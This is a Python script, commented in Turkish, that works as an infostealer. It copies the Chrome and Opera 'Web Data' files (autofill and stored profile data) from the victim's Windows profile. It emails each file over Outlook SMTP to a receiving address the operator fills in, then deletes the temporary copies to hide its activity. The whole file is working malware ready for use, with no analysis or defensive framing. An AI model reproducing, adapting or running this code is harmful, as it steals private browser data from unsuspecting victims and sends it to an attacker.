import os
import shutil
import smtplib
import ssl
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
password=""
# sadece outlook hesabıyla giriş yapılabilir.
sender_email = ""

#Yan hesabınız vs. olabilir cookielerin geleceği e posta hesabı isterseniz temp mailde kullanabilirsiniz ama önermem.
receiver_email = ""

message = MIMEMultipart()
username = os.getlogin()
chpath = 'C:\\Users\\'+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data"
oppath = 'C:\\Users\\'+username+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data"
if os.path.exists(chpath) == True:
    try:
        shutil.copyfile(chpath, 'C:\\Users\\'+username+"\\Chrome Web Data")
    except:
        print("An error occruded.")
else:
    pass
if os.path.exists(oppath) == True:
    try:
        shutil.copyfile(oppath,'C:\\Users\\'+username+"\\Opera Web Data")
    except:
        print("An error occruded.")
else:
    pass
message["From"] = sender_email
message['To'] = receiver_email
message['Subject'] = "Passed Cookie (Chrome)"
file = 'C:\\Users\\'+username+"\\Chrome Web Data"
attachment = open(file,'rb')
obj = MIMEBase('application','octet-stream')
obj.set_payload((attachment).read())
encoders.encode_base64(obj)
obj.add_header('Content-Disposition',"attachment; filename= "+file)
message.attach(obj)
my_message = message.as_string()
context = ssl.create_default_context()
email_session = smtplib.SMTP('smtp.outlook.com',587)
email_session.ehlo()
email_session.starttls(context=context)
email_session.login(sender_email,password)
email_session.sendmail(sender_email,receiver_email,my_message)
attachment.close()
email_session.close()

time.sleep(3)

message["From"] = sender_email
message['To'] = receiver_email
message['Subject'] = "Passed Cookie (Opera)"
file = 'C:\\Users\\'+username+"\Opera Web Data"
attachment = open(file,'rb')
obj = MIMEBase('application','octet-stream')
obj.set_payload((attachment).read())
encoders.encode_base64(obj)
obj.add_header('Content-Disposition',"attachment; filename= "+file)
message.attach(obj)
my_message = message.as_string()
context = ssl.create_default_context()
email_session = smtplib.SMTP('smtp.outlook.com',587)
email_session.ehlo()
email_session.starttls(context=context)
email_session.login(sender_email,password)
email_session.sendmail(sender_email,receiver_email,my_message)
attachment.close()
email_session.close()
if os.path.exists('C:\\Users\\'+username+"\\Chrome Web Data"):
    os.remove('C:\\Users\\'+username+"\\Chrome Web Data")
else:
    pass
if os.path.exists('C:\\Users\\'+username+"\\Opera Web Data"):
    os.remove('C:\\Users\\'+username+"\\Opera Web Data")
